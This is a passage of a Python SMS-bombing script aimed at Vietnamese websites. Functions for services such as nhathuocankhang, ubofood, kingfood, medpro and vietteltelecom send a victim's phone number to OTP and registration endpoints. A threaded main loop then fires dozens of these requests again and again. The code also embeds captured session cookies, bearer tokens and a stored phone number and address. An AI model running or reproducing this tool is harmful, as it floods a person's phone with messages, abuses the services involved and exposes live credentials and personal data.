    'MWG_ORDERHISTORY_SS': 'CfDJ8ImUV2tmepFDqJx13sccnB7in0gO8PCWqyc3hT%2FejR%2BAjXGXRunriLEicTEI7zFCSkP8PORJAs%2BD7Vz5RSZVJz5WIKtidzmjfC0UTeicuJx5NtKCLvaZHkbVo6ISjL6CIL2TpAWzchMrs3eekVMKM3ZXDwn5mIB2OB9XBFhWxGoV',
    'cebsp_': '7',
    'SvID': 'ak213|ZRW6x|ZRW3q',
    '_ga_D1DPPSN7B8': 'GS1.1.1695922088.1.1.1695922903.60.0.0',
  }

  headers = {
    'authority': 'www.nhathuocankhang.com',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8OzT4w9F3NBBtKYXpiQJSWtbPxkgf9niVbr-A8_b54VRk9EwW1dUlLkPyrkqAHpgqJ6InlJ-o1l4EeR5HYe1rJjL08ILcZrnXKPjUTpSzFuzBHNpvJFBLCQvvBJNA6akgcSlsugBBCkoby2rB1wytbU; MWG_PRODUCT_BASIC_DB=HyquOkFO4n2EMZkPRMdZ7%2FCpi7fO462DztzR0HUNlniov5_ncPwr1A--; MWG_CART_SS_10=CfDJ8EAyW5oxzlJBpu%2Fem4xhyNuSX%2BAvdK%2FAPsi9sIjzVyiqnwUDA9QrUbaD2IWKgpib1iRk4n1vCOgespXoAKw%2BETBDSDzpbDKPXyWsuJgk7g%2FmUPbYoWqOCm7sU7SLB91pwX2P8h4jW5ROzN0lKrN7nXOvOWS583as8Rz7gqwJtL67; _pk_ref.2.b94a=%5B%22%22%2C%22%22%2C1695922087%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.2.b94a=95fa589c26e0a0af.1695922087.; _pk_ses.2.b94a=1; _gcl_au=1.1.603406077.1695922088; _ga=GA1.1.1284062655.1695922088; cebs=1; _ce.s=v~549c1fab6cf28b01ba1bd61b556bc985441d6588~lcw~1695922089892~vpv~0~lcw~1695922089904; _ce.clock_event=1; _ce.clock_data=-957%2C171.250.162.38%2C2%2Ca19ac38e49c47d5c6963dc341558372d; ASP.NET_SessionId=ioxvprqp3ifyed0h30j0pixb; .AspNetCore.Antiforgery.4PZsHduyjpg=CfDJ8ImUV2tmepFDqJx13sccnB58D5oUm8oWvgyR2MkrGVCx1TLW0nQ0pjwzBM3tnKoPiMwduNFCi3X1pGpl5Eia70R055Rqvpv16Hm0SuxHG2VxhQwBoWMJPMGro6a8h1TAlc6Pm2J35UocrqymM6Mk93o; MWG_ORDERHISTORY_SS=CfDJ8ImUV2tmepFDqJx13sccnB7in0gO8PCWqyc3hT%2FejR%2BAjXGXRunriLEicTEI7zFCSkP8PORJAs%2BD7Vz5RSZVJz5WIKtidzmjfC0UTeicuJx5NtKCLvaZHkbVo6ISjL6CIL2TpAWzchMrs3eekVMKM3ZXDwn5mIB2OB9XBFhWxGoV; cebsp_=7; SvID=ak213|ZRW6x|ZRW3q; _ga_D1DPPSN7B8=GS1.1.1695922088.1.1.1695922903.60.0.0',
    'origin': 'https://www.nhathuocankhang.com',
    'referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phoneNumber': "84" + sdt ,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB6OmkYqUNbzb1Mx-s9bQVhG-AlO7lIBNKwbiKBXUFKtbePvlZ0BOvL_nL4HzFJUPuvA8KIUoAZOZBKz4R9XqES6B2mPfgfUdVXrerW9A8D8_gij0EfVYCtv941INjA1ETU',
  }

  response = requests.post(
    'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
  )
  
#ubofood
def ubofood(sdt):
  cookies = {
    '_gcl_au': '1.1.1571478923.1695924370',
    '_ga': 'GA1.1.1573292715.1695924370',
    '_tt_enable_cookie': '1',
    '_ttp': '3CPN-XK-2FjBtBit8kyi65DoHSq',
    'ubo_trade': '%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D',
    'ubo_token': 'Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjc0NjAzNzIsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.VJw2De4r2E-76hFcdvwXMnLyYf8Qq2elODP-MxeKZvnxe_mcDCkKHmsy3FHM-STxh1ZHIbdjrHRnUykBbzFTDKfd-8i0fFfRzjsiYQQGarPnRrCs6xeBqbEhY8dz4SD3h4STim4bd_IOO2ANy1bR_XldGST2uJG2cJIaWEtrDtSDh7H_tqFfP5DwnsMKvJiSDvPIfr69CALLEP-qwjkczthn6nJBVEl85J0kmEHegOdf9-ug8kur0V6puMIstryqDUZYLLRFfMxxAlOt1a_qYQSpQ2NTeKivNf8HG6YZgtp1eocPNiuaBfybBZB6FMXmAQkzZ4eJm874SWZpMXEnWhN39d6BDvQJe4r8ovA6Pu16xqVrQuLH8hgbWeBcO1NnAD0_baYrc4omxVuSpHh3iGg4CTNbR4pqPHDbbkHsMhpQa1EbzSpKLrK0Qf-0YgOUzaHufCFSGmDxDCT1iIcuv_QYgbhdrjJmufwLj9X4TTiQaHYJr2bfsU2TxA4YCfJ7_a-PzN6meL2mqbaomrWIvp4GhJ8N7IGi360IkuPO8frOPAi3szYHR01GgR4tNBwedlJRRNZNgMHhqc8-zEpa6YIGwNrC-_x6Pbq5Yd8e4t8HaHx2PTBi5w0hVR6PZlGbOY3gK30cUXf0bbQisoxkPK21FUdI4r-92zPXJtn-B78',
    '_ga_KCGG79N4SY': 'GS1.1.1695924370.1.1.1695924427.0.0.0',
    '_ga_3PKTQRQF3P': 'GS1.1.1695924370.1.1.1695924428.2.0.0',
  }

  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjc0NjAzNzIsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.VJw2De4r2E-76hFcdvwXMnLyYf8Qq2elODP-MxeKZvnxe_mcDCkKHmsy3FHM-STxh1ZHIbdjrHRnUykBbzFTDKfd-8i0fFfRzjsiYQQGarPnRrCs6xeBqbEhY8dz4SD3h4STim4bd_IOO2ANy1bR_XldGST2uJG2cJIaWEtrDtSDh7H_tqFfP5DwnsMKvJiSDvPIfr69CALLEP-qwjkczthn6nJBVEl85J0kmEHegOdf9-ug8kur0V6puMIstryqDUZYLLRFfMxxAlOt1a_qYQSpQ2NTeKivNf8HG6YZgtp1eocPNiuaBfybBZB6FMXmAQkzZ4eJm874SWZpMXEnWhN39d6BDvQJe4r8ovA6Pu16xqVrQuLH8hgbWeBcO1NnAD0_baYrc4omxVuSpHh3iGg4CTNbR4pqPHDbbkHsMhpQa1EbzSpKLrK0Qf-0YgOUzaHufCFSGmDxDCT1iIcuv_QYgbhdrjJmufwLj9X4TTiQaHYJr2bfsU2TxA4YCfJ7_a-PzN6meL2mqbaomrWIvp4GhJ8N7IGi360IkuPO8frOPAi3szYHR01GgR4tNBwedlJRRNZNgMHhqc8-zEpa6YIGwNrC-_x6Pbq5Yd8e4t8HaHx2PTBi5w0hVR6PZlGbOY3gK30cUXf0bbQisoxkPK21FUdI4r-92zPXJtn-B78',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1571478923.1695924370; _ga=GA1.1.1573292715.1695924370; _tt_enable_cookie=1; _ttp=3CPN-XK-2FjBtBit8kyi65DoHSq; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjc0NjAzNzIsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.VJw2De4r2E-76hFcdvwXMnLyYf8Qq2elODP-MxeKZvnxe_mcDCkKHmsy3FHM-STxh1ZHIbdjrHRnUykBbzFTDKfd-8i0fFfRzjsiYQQGarPnRrCs6xeBqbEhY8dz4SD3h4STim4bd_IOO2ANy1bR_XldGST2uJG2cJIaWEtrDtSDh7H_tqFfP5DwnsMKvJiSDvPIfr69CALLEP-qwjkczthn6nJBVEl85J0kmEHegOdf9-ug8kur0V6puMIstryqDUZYLLRFfMxxAlOt1a_qYQSpQ2NTeKivNf8HG6YZgtp1eocPNiuaBfybBZB6FMXmAQkzZ4eJm874SWZpMXEnWhN39d6BDvQJe4r8ovA6Pu16xqVrQuLH8hgbWeBcO1NnAD0_baYrc4omxVuSpHh3iGg4CTNbR4pqPHDbbkHsMhpQa1EbzSpKLrK0Qf-0YgOUzaHufCFSGmDxDCT1iIcuv_QYgbhdrjJmufwLj9X4TTiQaHYJr2bfsU2TxA4YCfJ7_a-PzN6meL2mqbaomrWIvp4GhJ8N7IGi360IkuPO8frOPAi3szYHR01GgR4tNBwedlJRRNZNgMHhqc8-zEpa6YIGwNrC-_x6Pbq5Yd8e4t8HaHx2PTBi5w0hVR6PZlGbOY3gK30cUXf0bbQisoxkPK21FUdI4r-92zPXJtn-B78; _ga_KCGG79N4SY=GS1.1.1695924370.1.1.1695924427.0.0.0; _ga_3PKTQRQF3P=GS1.1.1695924370.1.1.1695924428.2.0.0',
    'Origin': 'https://ubofood.com',
    'Referer': 'https://ubofood.com/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
  }

  data = '{"phone_number":"sdt","trade_code":"379760000"}'

  response = requests.post('https://ubofood.com/api/v1/account/customers/register', cookies=cookies, headers=headers, data=data)
  
#gogogizmo
def gogogizmo(sdt):
  headers = {
    'authority': 'gogogizmo.shop',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'lang': 'vi_VN',
    'origin': 'https://gogogizmo.shop',
    'referer': 'https://gogogizmo.shop/pages/user/Login/index',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': '84' + sdt  ,
    'email': 'example@gmail.com',
    'type': 'register',
    'regType': '1',
  }

  response = requests.post('https://gogogizmo.shop/api/register/verify', headers=headers, json=json_data)

#kingfood
def kingfood(sdt):
  headers = {
    'authority': 'api.onelife.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': sdt,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
  }

  response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
  
#medpro  
def medpro(sdt):
  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://id-v121.medpro.com.vn',
    'Referer': 'https://id-v121.medpro.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'appid': 'medpro',
    'cskhtoken': '',
    'locale': '',
    'momoid': '',
    'osid': '',
    'ostoken': '',
    'partnerid': 'medpro',
    'platform': 'web',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
  }

  json_data = {
    'fullname': 'người dùng medpro',
    'deviceId': 'e828ac7622f17151c5e1f46349194f7e',
    'phone': 'phone[1:11]',
    'type': 'password',
  }

  response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
  
def kingfood(sdt):
  headers = {
    'authority': 'api.onelife.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': sdt,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
  }

  response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
  
#medpro  
def medpro(sdt):
  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://id-v121.medpro.com.vn',
    'Referer': 'https://id-v121.medpro.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'appid': 'medpro',
    'cskhtoken': '',
    'locale': '',
    'momoid': '',
    'osid': '',
    'ostoken': '',
    'partnerid': 'medpro',
    'platform': 'web',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
  }

  json_data = {
    'fullname': 'người dùng medpro',
    'deviceId': 'e828ac7622f17151c5e1f46349194f7e',
    'phone': 'phone[1:11]',
    'type': 'password',
  }

  response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)

#y360
def y360(sdt):
  cookies = {
    '_fbp': 'fb.1.1696866076802.1634297592',
    '_gid': 'GA1.2.1540474300.1696866077',
    '_ga_M7ZN50PQ1V': 'GS1.1.1696866077.1.1.1696866086.0.0.0',
    '_ga': 'GA1.1.450461889.1696866077',
    '_gcl_au': '1.1.2047176709.1696866077.2076267400.1696866107.1696866164',
    '_ga_BS2V9QEV6V': 'GS1.1.1696866076.1.1.1696866168.0.0.0',
  }

  headers = {
    'authority': 'y360.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    # 'cookie': '_fbp=fb.1.1696866076802.1634297592; _gid=GA1.2.1540474300.1696866077; _ga_M7ZN50PQ1V=GS1.1.1696866077.1.1.1696866086.0.0.0; _ga=GA1.1.450461889.1696866077; _gcl_au=1.1.2047176709.1696866077.2076267400.1696866107.1696866164; _ga_BS2V9QEV6V=GS1.1.1696866076.1.1.1696866168.0.0.0',
    'origin': 'https://y360.vn',
    'referer': 'https://y360.vn/hoc/register/code-verify/66598771-5457-11ee-a400-0242ac150006',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'id': 30826,
    'username': '',
    'first_name': None,
    'last_name': None,
    'phone': 'sdt',
    'avatar': '',
    'certificate_file': '',
    'group_id': 3,
    'role_label': 'Học viên',
    'last_login_at': None,
    'last_login_ip': None,
    'status': 1,
    'sex': 0,
    'hospital': None,
    'birth_day': None,
    'place_birth': 0,
    'province_id': 0,
    'district_id': 0,
    'ward_id': 0,
    'address': None,
    'speciality': 0,
    'province': '',
    'district': '',
    'ward': '',
    'academic_rank': None,
    'degree': None,
    'academic_rank_name': '',
    'degree_name': '',
    'register_uid': '66598771-5457-11ee-a400-0242ac150006',
    'register_step': 1,
    'register_code': None,
    'register_consent': 0,
    'user_source': 'register',
    'user_secret': None,
    'version_code': None,
    'device_name': None,
    'imei': None,
    'os': None,
    'platform': None,
    'is_course_approval': 0,
  }

  response = requests.post('https://y360.vn/api/v1/user/resendCode', cookies=cookies, headers=headers, json=json_data)

#myviettel
def myviettel(sdt):
  cookies = {
    'laravel_session': 'dgzP9BMGgS7kGJNOtixPqkCNavEQ8MIjHw0pTblv',
    '__zi': '3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BtNA8ilBNM07PUe-ny99P0jKnZRJ-arq8q3Kv.1',
    'XSRF-TOKEN': 'eyJpdiI6IjlXYVRUZHJaUXhIZzNSa21KY0ZlNWc9PSIsInZhbHVlIjoiS0EyZ1VwYTJ1Wk5LSXhRVHBBMWRHVG1vcEtySU9mNkYrT2ZxelNLUTE3VkwzU0N5aitLd3NvT1NYK0NFSCtjQyIsIm1hYyI6ImY5OTBjMjllNzgxYjExMDMyNGQzNGJjMDJjNTg4MzA2NWJmZDNlMmJiNTczYWRhMjgwNDZjMmIxNDIwZTgwOWIifQ%3D%3D',
  }

  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    # 'Cookie': 'laravel_session=dgzP9BMGgS7kGJNOtixPqkCNavEQ8MIjHw0pTblv; __zi=3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BtNA8ilBNM07PUe-ny99P0jKnZRJ-arq8q3Kv.1; XSRF-TOKEN=eyJpdiI6IjlXYVRUZHJaUXhIZzNSa21KY0ZlNWc9PSIsInZhbHVlIjoiS0EyZ1VwYTJ1Wk5LSXhRVHBBMWRHVG1vcEtySU9mNkYrT2ZxelNLUTE3VkwzU0N5aitLd3NvT1NYK0NFSCtjQyIsIm1hYyI6ImY5OTBjMjllNzgxYjExMDMyNGQzNGJjMDJjNTg4MzA2NWJmZDNlMmJiNTczYWRhMjgwNDZjMmIxNDIwZTgwOWIifQ%3D%3D',
    'Origin': 'https://vietteltelecom.vn',
    'Referer': 'https://vietteltelecom.vn/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-CSRF-TOKEN': 'CXeh2e4nVXlcu1wmCsOyfODQZRLKUSZHfKXvktco',
    'X-Requested-With': 'XMLHttpRequest',
    'X-XSRF-TOKEN': 'eyJpdiI6IjlXYVRUZHJaUXhIZzNSa21KY0ZlNWc9PSIsInZhbHVlIjoiS0EyZ1VwYTJ1Wk5LSXhRVHBBMWRHVG1vcEtySU9mNkYrT2ZxelNLUTE3VkwzU0N5aitLd3NvT1NYK0NFSCtjQyIsIm1hYyI6ImY5OTBjMjllNzgxYjExMDMyNGQzNGJjMDJjNTg4MzA2NWJmZDNlMmJiNTczYWRhMjgwNDZjMmIxNDIwZTgwOWIifQ==',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
  }

  json_data = {
    'msisdn': sdt,
  }

  response = requests.post('https://vietteltelecom.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
 
# ham trung tam
def mainn(sdt,amount):
 for i in range(amount):
# mau  
  threading.submit(phamacy,sdt)
  threading.submit(beecow,sdt) 
  threading.submit(pizzacompany,sdt)     
  threading.submit(ghn,sdt)
  threading.submit(best_inc,sdt)   
  threading.submit(appota,sdt)   
  threading.submit(fpt1,sdt)   
  threading.submit(fpt2,sdt)    
  threading.submit(ahamove,sdt)   
  threading.submit(dkvt,sdt)  
  threading.submit(viettel,sdt)   
  threading.submit(PHUCLONG1,sdt) 
  threading.submit(PHUCLONG2,sdt) 
  threading.submit(F881,sdt)  
  threading.submit(F882,sdt)
  threading.submit(F883,sdt)
  threading.submit(tv360,sdt)   
  threading.submit(tv360,sdt)   
  threading.submit(TV360,sdt)  
  threading.submit(vieon,sdt)   
  threading.submit(vieon1,sdt)      
  threading.submit(VIEON,sdt) 
  threading.submit(vieon,sdt) #
  threading.submit(pizzacompany,sdt)
  threading.submit(phamacy,sdt)
  threading.submit(fpt,sdt)
  threading.submit(tv360,sdt)
  threading.submit(dkvt,sdt)
  threading.submit(viettel,sdt)#  
  threading.submit(gogogizmo,sdt)

  threading.submit(pkdkdphuong,sdt)

  threading.submit(bluescope,sdt)

  threading.submit(winmart,sdt)

  threading.submit(medigoapp,sdt)
  
  threading.submit(nhathuocankhang,sdt)

  threading.submit(ubofood,sdt)

  threading.submit(gogogizmo,sdt)

  threading.submit(kingfood,sdt)
    
  threading.submit(medpro,sdt)
  
  threading.submit(y360,sdt)

  threading.submit(myviettel,sdt)
  time.sleep(1)
          
# chay
mainn(sdt,amount)  